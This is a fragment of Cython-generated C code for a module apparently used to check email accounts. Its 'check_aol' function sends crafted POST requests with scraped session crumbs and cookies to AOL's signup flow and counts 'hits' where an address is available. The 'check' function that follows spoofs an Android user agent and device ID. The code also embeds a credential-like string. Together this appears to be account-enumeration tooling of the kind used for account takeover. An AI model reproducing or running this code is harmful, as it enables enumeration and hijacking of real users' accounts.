      PyTuple_SET_ITEM(__pyx_t_8, 12, __pyx_kp_u_password_Drahmed2006_mm_10_dd_2);
      __pyx_t_19 = __Pyx_PyUnicode_Join(__pyx_t_8, 13, __pyx_t_17, __pyx_t_29); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 480, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_19);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_v_data = ((PyObject*)__pyx_t_19);
      __pyx_t_19 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_19, __pyx_n_s_requests); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 482, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_19);
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_19, __pyx_n_s_post); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 482, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;

      
      __pyx_t_19 = __Pyx_PyDict_NewPresized(4); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 484, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_19);
      if (PyDict_SetItem(__pyx_t_19, __pyx_n_s_params, __pyx_v_params) < 0) __PYX_ERR(0, 484, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_19, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 484, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_19, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 484, __pyx_L3_error)

      
      if (unlikely(!__pyx_v_cookies)) { __Pyx_RaiseUnboundLocalError("cookies"); __PYX_ERR(0, 487, __pyx_L3_error) }
      if (PyDict_SetItem(__pyx_t_19, __pyx_n_s_cookies, __pyx_v_cookies) < 0) __PYX_ERR(0, 484, __pyx_L3_error)

      
      __pyx_t_20 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_tuple__44, __pyx_t_19); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 482, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_20);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;

      
      __pyx_t_19 = __Pyx_PyObject_GetAttrStr(__pyx_t_20, __pyx_n_s_text); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 487, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_19);
      __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
      __pyx_v_res = __pyx_t_19;
      __pyx_t_19 = 0;

      
      __pyx_t_5 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u_errors, __pyx_v_res, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 488, __pyx_L3_error)
      __pyx_t_4 = (__pyx_t_5 != 0);
      if (__pyx_t_4) {

        
        __Pyx_GetModuleGlobalName(__pyx_t_19, __pyx_n_s_hits); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 489, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_19);
        __pyx_t_20 = __Pyx_PyInt_AddObjC(__pyx_t_19, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 489, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_20);
        __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_hits, __pyx_t_20) < 0) __PYX_ERR(0, 489, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_19, __pyx_n_s_pppp); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 490, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_19);
        __pyx_t_8 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_19))) {
          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_19);
          if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_19);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_19, function);
          }
        }
        __pyx_t_20 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_19, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_19);
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 490, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_20);
        __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
        __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;

        
        __pyx_t_4 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u__39, __pyx_v_email, Py_NE)); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 491, __pyx_L3_error)
        __pyx_t_5 = (__pyx_t_4 != 0);
        if (__pyx_t_5) {

          
          __pyx_t_20 = PyNumber_Add(__pyx_v_email, __pyx_kp_u_aol_com); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 492, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_20);
          __pyx_v_ok = __pyx_t_20;
          __pyx_t_20 = 0;

          
          __pyx_t_19 = __Pyx_PyObject_GetAttrStr(__pyx_v_ok, __pyx_n_s_split); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 493, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_19);
          __pyx_t_8 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_19))) {
            __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_19);
            if (likely(__pyx_t_8)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_19);
              __Pyx_INCREF(__pyx_t_8);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_19, function);
            }
          }
          __pyx_t_20 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_19, __pyx_t_8, __pyx_kp_u__39) : __Pyx_PyObject_CallOneArg(__pyx_t_19, __pyx_kp_u__39);
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 493, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_20);
          __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
          if ((likely(PyTuple_CheckExact(__pyx_t_20))) || (PyList_CheckExact(__pyx_t_20))) {
            PyObject* sequence = __pyx_t_20;
            Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
            if (unlikely(size != 2)) {
              if (size > 2) __Pyx_RaiseTooManyValuesError(2);
              else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
              __PYX_ERR(0, 493, __pyx_L3_error)
            }
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            if (likely(PyTuple_CheckExact(sequence))) {
              __pyx_t_19 = PyTuple_GET_ITEM(sequence, 0); 
              __pyx_t_8 = PyTuple_GET_ITEM(sequence, 1); 
            } else {
              __pyx_t_19 = PyList_GET_ITEM(sequence, 0); 
              __pyx_t_8 = PyList_GET_ITEM(sequence, 1); 
            }
            __Pyx_INCREF(__pyx_t_19);
            __Pyx_INCREF(__pyx_t_8);
            #else
            __pyx_t_19 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 493, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_19);
            __pyx_t_8 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 493, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_8);
            #endif
            __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
          } else {
            Py_ssize_t index = -1;
            __pyx_t_22 = PyObject_GetIter(__pyx_t_20); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 493, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_22);
            __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
            __pyx_t_23 = Py_TYPE(__pyx_t_22)->tp_iternext;
            index = 0; __pyx_t_19 = __pyx_t_23(__pyx_t_22); if (unlikely(!__pyx_t_19)) goto __pyx_L96_unpacking_failed;
            __Pyx_GOTREF(__pyx_t_19);
            index = 1; __pyx_t_8 = __pyx_t_23(__pyx_t_22); if (unlikely(!__pyx_t_8)) goto __pyx_L96_unpacking_failed;
            __Pyx_GOTREF(__pyx_t_8);
            if (__Pyx_IternextUnpackEndCheck(__pyx_t_23(__pyx_t_22), 2) < 0) __PYX_ERR(0, 493, __pyx_L3_error)
            __pyx_t_23 = NULL;
            __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
            goto __pyx_L97_unpacking_done;
            __pyx_L96_unpacking_failed:;
            __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
            __pyx_t_23 = NULL;
            if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
            __PYX_ERR(0, 493, __pyx_L3_error)
            __pyx_L97_unpacking_done:;
          }
          __pyx_v_username = __pyx_t_19;
          __pyx_t_19 = 0;
          __pyx_v_gg = __pyx_t_8;
          __pyx_t_8 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_InfoAcc); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 494, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_8);
          __pyx_t_19 = NULL;
          __pyx_t_25 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
            __pyx_t_19 = PyMethod_GET_SELF(__pyx_t_8);
            if (likely(__pyx_t_19)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
              __Pyx_INCREF(__pyx_t_19);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_8, function);
              __pyx_t_25 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_8)) {
            PyObject *__pyx_temp[3] = {__pyx_t_19, __pyx_v_username, __pyx_v_gg};
            __pyx_t_20 = __Pyx_PyFunction_FastCall(__pyx_t_8, __pyx_temp+1-__pyx_t_25, 2+__pyx_t_25); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 494, __pyx_L3_error)
            __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
            __Pyx_GOTREF(__pyx_t_20);
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_8)) {
            PyObject *__pyx_temp[3] = {__pyx_t_19, __pyx_v_username, __pyx_v_gg};
            __pyx_t_20 = __Pyx_PyCFunction_FastCall(__pyx_t_8, __pyx_temp+1-__pyx_t_25, 2+__pyx_t_25); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 494, __pyx_L3_error)
            __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
            __Pyx_GOTREF(__pyx_t_20);
          } else
          #endif
          {
            __pyx_t_22 = PyTuple_New(2+__pyx_t_25); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 494, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_22);
            if (__pyx_t_19) {
              __Pyx_GIVEREF(__pyx_t_19); PyTuple_SET_ITEM(__pyx_t_22, 0, __pyx_t_19); __pyx_t_19 = NULL;
            }
            __Pyx_INCREF(__pyx_v_username);
            __Pyx_GIVEREF(__pyx_v_username);
            PyTuple_SET_ITEM(__pyx_t_22, 0+__pyx_t_25, __pyx_v_username);
            __Pyx_INCREF(__pyx_v_gg);
            __Pyx_GIVEREF(__pyx_v_gg);
            PyTuple_SET_ITEM(__pyx_t_22, 1+__pyx_t_25, __pyx_v_gg);
            __pyx_t_20 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_t_22, NULL); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 494, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_20);
            __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
          }
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;

          
          goto __pyx_L95;
        }

        
        /*else*/ {
          __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_email, __pyx_n_s_split); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 496, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_8);
          __pyx_t_22 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
            __pyx_t_22 = PyMethod_GET_SELF(__pyx_t_8);
            if (likely(__pyx_t_22)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
              __Pyx_INCREF(__pyx_t_22);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_8, function);
            }
          }
          __pyx_t_20 = (__pyx_t_22) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_22, __pyx_kp_u__39) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_kp_u__39);
          __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
          if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 496, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_20);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          if ((likely(PyTuple_CheckExact(__pyx_t_20))) || (PyList_CheckExact(__pyx_t_20))) {
            PyObject* sequence = __pyx_t_20;
            Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
            if (unlikely(size != 2)) {
              if (size > 2) __Pyx_RaiseTooManyValuesError(2);
              else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
              __PYX_ERR(0, 496, __pyx_L3_error)
            }
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            if (likely(PyTuple_CheckExact(sequence))) {
              __pyx_t_8 = PyTuple_GET_ITEM(sequence, 0); 
              __pyx_t_22 = PyTuple_GET_ITEM(sequence, 1); 
            } else {
              __pyx_t_8 = PyList_GET_ITEM(sequence, 0); 
              __pyx_t_22 = PyList_GET_ITEM(sequence, 1); 
            }
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(__pyx_t_22);
            #else
            __pyx_t_8 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 496, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_22 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 496, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_22);
            #endif
            __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
          } else {
            Py_ssize_t index = -1;
            __pyx_t_19 = PyObject_GetIter(__pyx_t_20); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 496, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_19);
            __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
            __pyx_t_23 = Py_TYPE(__pyx_t_19)->tp_iternext;
            index = 0; __pyx_t_8 = __pyx_t_23(__pyx_t_19); if (unlikely(!__pyx_t_8)) goto __pyx_L98_unpacking_failed;
            __Pyx_GOTREF(__pyx_t_8);
            index = 1; __pyx_t_22 = __pyx_t_23(__pyx_t_19); if (unlikely(!__pyx_t_22)) goto __pyx_L98_unpacking_failed;
            __Pyx_GOTREF(__pyx_t_22);
            if (__Pyx_IternextUnpackEndCheck(__pyx_t_23(__pyx_t_19), 2) < 0) __PYX_ERR(0, 496, __pyx_L3_error)
            __pyx_t_23 = NULL;
            __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
            goto __pyx_L99_unpacking_done;
            __pyx_L98_unpacking_failed:;
            __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
            __pyx_t_23 = NULL;
            if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
            __PYX_ERR(0, 496, __pyx_L3_error)
            __pyx_L99_unpacking_done:;
          }
          __pyx_v_username = __pyx_t_8;
          __pyx_t_8 = 0;
          __pyx_v_gg = __pyx_t_22;
          __pyx_t_22 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_22, __pyx_n_s_InfoAcc); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 497, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_22);
          __pyx_t_8 = NULL;
          __pyx_t_25 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_22))) {
            __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_22);
            if (likely(__pyx_t_8)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_22);
              __Pyx_INCREF(__pyx_t_8);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_22, function);
              __pyx_t_25 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_22)) {
            PyObject *__pyx_temp[3] = {__pyx_t_8, __pyx_v_username, __pyx_v_gg};
            __pyx_t_20 = __Pyx_PyFunction_FastCall(__pyx_t_22, __pyx_temp+1-__pyx_t_25, 2+__pyx_t_25); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 497, __pyx_L3_error)
            __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_GOTREF(__pyx_t_20);
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_22)) {
            PyObject *__pyx_temp[3] = {__pyx_t_8, __pyx_v_username, __pyx_v_gg};
            __pyx_t_20 = __Pyx_PyCFunction_FastCall(__pyx_t_22, __pyx_temp+1-__pyx_t_25, 2+__pyx_t_25); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 497, __pyx_L3_error)
            __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_GOTREF(__pyx_t_20);
          } else
          #endif
          {
            __pyx_t_19 = PyTuple_New(2+__pyx_t_25); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 497, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_19);
            if (__pyx_t_8) {
              __Pyx_GIVEREF(__pyx_t_8); PyTuple_SET_ITEM(__pyx_t_19, 0, __pyx_t_8); __pyx_t_8 = NULL;
            }
            __Pyx_INCREF(__pyx_v_username);
            __Pyx_GIVEREF(__pyx_v_username);
            PyTuple_SET_ITEM(__pyx_t_19, 0+__pyx_t_25, __pyx_v_username);
            __Pyx_INCREF(__pyx_v_gg);
            __Pyx_GIVEREF(__pyx_v_gg);
            PyTuple_SET_ITEM(__pyx_t_19, 1+__pyx_t_25, __pyx_v_gg);
            __pyx_t_20 = __Pyx_PyObject_Call(__pyx_t_22, __pyx_t_19, NULL); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 497, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_20);
            __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
          }
          __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
          __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
        }
        __pyx_L95:;

        
        goto __pyx_L94;
      }

      
      /*else*/ {
        __Pyx_GetModuleGlobalName(__pyx_t_20, __pyx_n_s_bademail); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 499, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_20);
        __pyx_t_22 = __Pyx_PyInt_AddObjC(__pyx_t_20, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 499, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_22);
        __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_bademail, __pyx_t_22) < 0) __PYX_ERR(0, 499, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_20, __pyx_n_s_pppp); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_20);
        __pyx_t_19 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_20))) {
          __pyx_t_19 = PyMethod_GET_SELF(__pyx_t_20);
          if (likely(__pyx_t_19)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_20);
            __Pyx_INCREF(__pyx_t_19);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_20, function);
          }
        }
        __pyx_t_22 = (__pyx_t_19) ? __Pyx_PyObject_CallOneArg(__pyx_t_20, __pyx_t_19) : __Pyx_PyObject_CallNoArg(__pyx_t_20);
        __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
        if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_22);
        __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
        __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
      }
      __pyx_L94:;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
    __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
    __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
    __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
    __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
    __Pyx_XDECREF(__pyx_t_26); __pyx_t_26 = 0;
    __Pyx_XDECREF(__pyx_t_27); __pyx_t_27 = 0;
    __Pyx_XDECREF(__pyx_t_28); __pyx_t_28 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    
    __pyx_t_25 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_25) {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_13);
  __Pyx_XDECREF(__pyx_t_19);
  __Pyx_XDECREF(__pyx_t_20);
  __Pyx_XDECREF(__pyx_t_21);
  __Pyx_XDECREF(__pyx_t_22);
  __Pyx_XDECREF(__pyx_t_26);
  __Pyx_XDECREF(__pyx_t_27);
  __Pyx_XDECREF(__pyx_t_28);
  __Pyx_AddTraceback("source.check_aol", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_name);
  __Pyx_XDECREF(__pyx_v_f);
  __Pyx_XDECREF(__pyx_v_line);
  __Pyx_XDECREF(__pyx_v_specData);
  __Pyx_XDECREF(__pyx_v_specId);
  __Pyx_XDECREF(__pyx_v_crumb);
  __Pyx_XDECREF(__pyx_v_sessionIndex);
  __Pyx_XDECREF(__pyx_v_acrumb);
  __Pyx_XDECREF(__pyx_v_cookies);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_params);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_res);
  __Pyx_XDECREF(__pyx_v_ok);
  __Pyx_XDECREF(__pyx_v_username);
  __Pyx_XDECREF(__pyx_v_gg);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_21check(PyObject *__pyx_self, PyObject *__pyx_v_email); /*proto*/
static PyMethodDef __pyx_mdef_6source_21check = {"check", (PyCFunction)__pyx_pw_6source_21check, METH_O, 0};
static PyObject *__pyx_pw_6source_21check(PyObject *__pyx_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("check (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_20check(__pyx_self, ((PyObject *)__pyx_v_email));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_20check(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_v_dev = NULL;
  PyObject *__pyx_v_device_id = NULL;
  PyObject *__pyx_v_uui = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  int __pyx_t_8;
  int __pyx_t_9;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("check", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 507, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 507, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_ua = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __Pyx_INCREF(__pyx_kp_u_android);
  __pyx_v_dev = __pyx_kp_u_android;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_hashlib); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 509, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_md5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 509, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_uuid); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 509, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 509, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_6, function);
    }
  }
  __pyx_t_3 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
